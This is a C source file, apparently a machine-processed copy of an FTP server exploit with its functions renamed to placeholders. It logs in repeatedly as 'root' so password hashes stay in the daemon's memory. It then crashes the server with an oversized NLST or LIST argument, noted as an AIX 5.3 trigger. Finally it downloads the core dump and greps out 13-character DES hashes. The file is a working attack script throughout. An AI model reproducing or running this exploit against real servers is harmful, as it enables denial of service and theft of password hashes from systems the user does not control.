#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  yo ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  cli ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int EOF ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 int O_CREAT ; 
 int O_WRONLY ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC0 (int,struct sockaddr*,int*) ; 
 int FUNC1 (char*) ; 
 scalar_t__ FUNC2 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC3 (struct sockaddr_in*,int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int FUNC5 (char*,char*) ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int FUNC9 (int,char**,char*) ; 
 int FUNC10 () ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int) ; 
 char* in ; 
 scalar_t__ FUNC13 (int,int) ; 
 scalar_t__ FUNC14 (int) ; 
 int /*<<< orphan*/  FUNC15 (char*,char,int) ; 
 int FUNC16 (char*,int) ; 
 int /*<<< orphan*/  out ; 
 int /*<<< orphan*/  FUNC17 (char*) ; 
 int /*<<< orphan*/  FUNC18 (char*) ; 
 int /*<<< orphan*/  FUNC19 (int,int /*<<< orphan*/ ) ; 
 int FUNC20 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC21 (int) ; 
 int /*<<< orphan*/  FUNC22 (int /*<<< orphan*/ ,int,char*,...) ; 
 int FUNC23 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC24 (char*,char*) ; 
 int /*<<< orphan*/  FUNC25 (char*) ; 
 int /*<<< orphan*/ * FUNC26 (char*,char*) ; 
 scalar_t__ FUNC27 (char*,char*) ; 
 int /*<<< orphan*/  FUNC28 (char*) ; 
 int /*<<< orphan*/  FUNC29 (char*) ; 
 int /*<<< orphan*/  FUNC30 (int,char*,int) ; 

int FUNC31(int argc, char *argv[])
{
 extern int optind;
 extern char *optarg;
 int haveuser=0,havepassword=0;
 int s,s2,nsock;
 int c,k,len;
 int fd;

 char *target = NULL;
 char *username = "ftp";
 char *password = "guest";
 char *writeto = "pub";
 char *crackme = "root";
 char *targetport = "21";
 int uselist = 0;
 char *myip = NULL;
 char *as = NULL;
 int octet_in[4], port;
 struct sockaddr_in yo, cli;
 char *oct = NULL;

 while ((c = FUNC9(argc, argv, "h:i:p:l:k:d:c:s")) != EOF) {
  switch(c) {
  case 'h':
    target = (char*)FUNC14(FUNC25(optarg)+1);
    FUNC24(target, optarg);
  break;
  case 'i':
    myip = (char*)FUNC14(FUNC25(optarg)+1);
    FUNC24(myip, optarg);
  break;
  case 'p':
    targetport = (char*)FUNC14(FUNC25(optarg)+1);
    FUNC24(targetport, optarg);
  break;
  case 'l':
    username = (char*)FUNC14(FUNC25(optarg)+1);
    FUNC24(username, optarg);
    haveuser = 1;
  break;
  case 'k':
    password = (char*)FUNC14(FUNC25(optarg)+1);
    FUNC24(password, optarg);
    havepassword = 1;
  break;
  case 'd':
    writeto = (char*)FUNC14(FUNC25(optarg)+1);
    FUNC24(writeto, optarg);
  break;
  case 'c':
    crackme = (char*)FUNC14(FUNC25(optarg)+1);
    FUNC24(crackme, optarg);
  break;
  case 's':
    uselist = 1;
  break;
  default:
    FUNC29(argv[0]);
  }
 }

 if (target == NULL || myip == NULL)
  FUNC29(argv[0]);

 if ((haveuser && !havepassword) || (!haveuser && havepassword)) {
  FUNC29(argv[0]);
 }

 s = FUNC5(target, targetport);
 FUNC8(s);

 FUNC7(stderr, "populating DES hash in memory...\n");

 for (k=0;k<3;k++) { 
  FUNC22(out, sizeof out, "USER %s\r\n", crackme);
  FUNC19(s, out); 
  FUNC8(s);
  FUNC22(out, sizeof out, "PASS abcdef\r\n");
  FUNC19(s,out);
  FUNC8(s);
 }

 FUNC7(stderr, "logging in...\n");

 FUNC22(out, sizeof out, "USER %s\r\n", username);
 FUNC19(s, out); 
 FUNC8(s);
 FUNC22(out, sizeof out, "PASS %s\r\n", password);
 FUNC19(s,out);
 FUNC8(s);
 FUNC8(s);

 FUNC7(stderr, "changing directory...\n");

 FUNC22(out, sizeof out, "CWD %s\r\n", writeto);
 FUNC19(s, out); 
 FUNC8(s);

 FUNC7(stderr, "triggering segmentation violation...\n");

 as = (char*)FUNC14(2000);
 FUNC15(as, 'A', 2000);
 as[2000-1]=0;

 if (!uselist) {
  FUNC22(out, sizeof out, "NLST ~%s\r\n", as);
 } else {
  /* AIX 5.3 trigger - thanks to karol */
  FUNC22(out, sizeof out, "LIST ~%s\r\n", as);
 }
 FUNC19(s, out);

 FUNC15(in, '\0', sizeof in);
 if (FUNC20(s, in, sizeof in, 0) < 1) {
  FUNC18("trigger succeeded!\nwaiting for core file to be created...\n");
 } else {
  FUNC18("trigger seems to have failed, proceeding anyways...\n"
  "\nwaiting for core file to be created...\n");
 }

 FUNC21(5);

 FUNC4(s);

 s = FUNC5(target, targetport);
 FUNC8(s);

 FUNC7(stderr, "logging in 2nd time...\n");

 FUNC22(out, sizeof out, "USER %s\r\n", username);
 FUNC19(s, out); 
 FUNC8(s);
 FUNC22(out, sizeof out, "PASS %s\r\n", password);
 FUNC19(s,out);
 FUNC8(s);
 FUNC8(s);

 FUNC7(stderr, "changing directory...\n");

 FUNC22(out, sizeof out, "CWD %s\r\n", writeto);
 FUNC19(s, out); 
 FUNC8(s);

 FUNC7(stderr, "getting core file...\n");

 FUNC22(out, sizeof out, "TYPE I\r\n");
 FUNC19(s, out); 
 FUNC8(s);

 port = FUNC10() + 1024;
 len = sizeof(cli);

 FUNC3(&yo, sizeof(yo));
 yo.sin_family = AF_INET;
 yo.sin_port=FUNC12(port);
 yo.sin_addr.s_addr = FUNC11(INADDR_ANY);

 oct=(char *)FUNC27(myip,".");
 octet_in[0]=FUNC1(oct);
 oct=(char *)FUNC27(NULL,".");
 octet_in[1]=FUNC1(oct);
 oct=(char *)FUNC27(NULL,".");
 octet_in[2]=FUNC1(oct);
 oct=(char *)FUNC27(NULL,".");
 octet_in[3]=FUNC1(oct);

 FUNC22(out, sizeof out, "PORT %d,%d,%d,%d,%d,%d\r\n", octet_in[0], octet_in[1], octet_in[2], octet_in[3], port / 256, port % 256);
 FUNC19(s, out); 
 FUNC8(s); 

 if ((s2=FUNC23(AF_INET, SOCK_STREAM, 0)) < 0) {
  FUNC17("socket");
  return -1;
 }

 if ((FUNC2(s2, (struct sockaddr *) &yo, sizeof(yo))) < 0) {
  FUNC17("bind");
  FUNC4(s2);
  FUNC6(1);
 }

 if (FUNC13(s2, 10) < 0) {
  FUNC17("listen");
  FUNC4(s2);
  FUNC6(1);
 }

 FUNC22(out, sizeof out, "RETR core\r\n");
 FUNC19(s, out); 
 FUNC8(s); 
 if (FUNC26(in, "150") == NULL) {
  FUNC7(stderr, "core file not found... terminating.\n");
  FUNC4(s);
  FUNC6(1);
 }

 fd = FUNC16("core", O_WRONLY | O_CREAT);
 if (fd == -1) {
  FUNC17("open on local core file");
  FUNC4(s);
  FUNC6(1);
 }

 FUNC21(1);

 if ((nsock = FUNC0(s2, (struct sockaddr *)&cli, &len)) < 0) {
  FUNC17("accept");
  FUNC4(s);
  FUNC6(1);
 }

 do {
  k = FUNC20(nsock, in, sizeof in, 0);
  if (k < 1) break;
  FUNC30(fd, in, k);
 } while (k > 0);

 FUNC4(nsock);
 FUNC4(fd);
 FUNC4(s); 

 FUNC7(stderr, "finally extracting DES hashes from core file for user '%s'...\n", crackme);
 FUNC28("strings core | grep '^[A-Za-z0-9]\\{13\\}$'");

 FUNC7(stderr, "done.\n");
 return 0;
}